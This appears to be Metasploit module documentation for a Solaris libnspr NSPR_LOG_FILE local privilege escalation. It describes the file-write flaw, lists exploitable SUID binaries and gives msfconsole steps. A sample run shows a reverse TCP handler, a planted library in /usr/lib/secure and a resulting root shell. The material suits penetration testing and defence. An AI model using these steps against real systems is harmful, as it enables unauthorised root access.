## Description

  This module exploits an arbitrary file write vulnerability in the
  Netscape Portable Runtime library (libnspr) on unpatched Solaris systems
  prior to Solaris 10u3 which allows users to gain root privileges.

  libnspr versions prior to 4.6.3 allow users to specify a log file with
  the `NSPR_LOG_FILE` environment variable. The log file is created with
  the privileges of the running process, resulting in privilege escalation
  when used in combination with a SUID executable.

  This module writes a shared object to the trusted library directory
  `/usr/lib/secure` and runs the specified SUID binary with the shared
  object loaded using the `LD_LIBRARY_PATH` environment variable.


## Vulnerable Application

  This module has been tested successfully with [libnspr](https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSPR)
  version 4.5.1 on Solaris 10u1 (01/06) (x86) and Solaris 10u2 (06/06) (x86).


## Verification Steps

  1. Start `msfconsole`
  2. Get a session
  3. Do: `use exploit/solaris/local/libnspr_nspr_log_file_priv_esc`
  4. Do: `set SESSION [SESSION]`
  5. Do: `run`
  6. You should get a new *root* session


## Options

  **SESSION**

  Which session to use, which can be viewed with `sessions`

  **SUID_PATH**

  Path to suid executable (must be linked to a vulnerable version of `libnspr4.so`)
  (default: `/usr/bin/cancel`)

  Some useful example SUID executables:

  * /usr/bin/cancel
  * /usr/bin/chkey
  * /usr/bin/lp
  * /usr/bin/lpset
  * /usr/bin/lpstat
  * /usr/lib/lp/bin/netpr
  * /usr/sbin/lpmove


## Scenarios

  ```
  msf5 > use exploit/solaris/local/libnspr_nspr_log_file_priv_esc 
  msf5 exploit(solaris/local/libnspr_nspr_log_file_priv_esc) > set session 1
  session => 1
  msf5 exploit(solaris/local/libnspr_nspr_log_file_priv_esc) > set lhost 172.16.191.196
  lhost => 172.16.191.196
  msf5 exploit(solaris/local/libnspr_nspr_log_file_priv_esc) > run

  [*] Started reverse TCP handler on 172.16.191.196:4444 
  [+] Created file /usr/lib/secure/libldap.so.5
  [*] Writing '/tmp/.8ENHI80b/.z6luu3Y1JC.c' (166 bytes) ...
  [*] Writing '/tmp/.8ENHI80b/.1hC6r9F' (175 bytes) ...
  [*] Executing payload...
  [+] Deleted /usr/lib/secure/libldap.so.5
  [+] Deleted /tmp/.8ENHI80b/.z6luu3Y1JC.c
  [+] Deleted /tmp/.8ENHI80b/.z6luu3Y1JC
  [!] Tried to delete /usr/lib/secure/libldap.so.5, unknown result
  [+] Deleted /tmp/.8ENHI80b/.1hC6r9F
  [+] Deleted /tmp/.8ENHI80b

  id
  uid=0(root) gid=0(root)
  uname -a
  SunOS unknown 5.10 Generic_118844-26 i86pc i386 i86pc
  ```

